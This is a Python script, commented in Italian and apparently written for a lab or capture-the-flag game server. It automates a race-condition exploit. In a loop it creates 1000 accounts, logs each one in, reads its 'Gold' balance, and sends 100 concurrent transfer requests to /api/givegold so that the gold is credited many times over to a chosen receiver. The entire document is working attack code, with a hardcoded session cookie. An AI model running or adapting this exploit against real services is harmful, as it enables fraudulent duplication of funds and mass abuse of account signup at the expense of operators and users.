IP = input('ip address: ')
name = input('name new account: ')
receiver = input('account high: ')
cookie_session = ''


print("\n\t[*] - Inzio del processo...")
for i in range(1000):
    import grequests
    import requests
    from bs4 import BeautifulSoup

    name_conc = '{}{}'.format(name,i)


    #################### SIGNUP ####################
    url = "http://{}/api/create".format(IP)
    payload='username={}&password={}&password2={}'.format(name_conc,name_conc,name_conc)
    headers = {
        'host': '{}'.format(IP),
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'accept-encoding': 'gzip, deflate',
        'content-type': 'application/x-www-form-urlencoded',
        'content-length': '46',
        'origin': 'http://{}'.format(IP),
        'connection': 'keep-alive',
        'referer': 'http://{}/create.html'.format(IP),
        'cookie': 'connect.sid=s%3AS4cKMEeXQmIYwxsJSm0ujlgQ7Y9Qnjkq.g1vQUusHnUb7DiS85RO1wFMgzkoqec37QBvGrLGQuHY',
        'upgrade-insecure-requests': '1'
    }
    response = requests.request("POST", url, headers=headers, data=payload)
    ################################################



    #################### LOGIN ####################
    payload = {
        'username': name_conc,
        'password': name_conc
    }
    # Retrieve Gold Amount and Cookie for the specified user.
    with requests.Session() as s: #IMPORTANTISSIMA COSA PER ME PERSONALE, mantenere la sessione attiva
        p = s.post('http://{}/api/login'.format(IP), data=payload)
        soup = BeautifulSoup(p.text, "html.parser")
        cookie_dict = s.cookies.get_dict()
        cookie_session = cookie_dict['connect.sid']
        for tag in soup.find_all('a'):
            if "Gold:" in tag.text:
                gold_amount = int(str(tag.text).split(":", 1)[1].strip())
    ################################################



    ################## SEND MONEY ##################
    url = "http://{}/api/givegold".format(IP)
    headers = {
        "Host" : "{}".format(IP),
        "Referer" : "http://{}/giving.html".format(IP),
        "Content-Type" : "application/x-www-form-urlencoded",
        "Connection" : "close",
        "Cookie" : "connect.sid={}".format(cookie_session),
        "Upgrade-Insecure-Requests" : "1"
    }
    cookies = { "connect.sid" : cookie_session }
    data = "user={}&amount={}".format(receiver,gold_amount)
    rs = (grequests.post(url, data=data, cookies=cookies, headers=headers) for i in range(0,100))
    requests = grequests.map(rs)
    ################################################

print("\t...fine!")




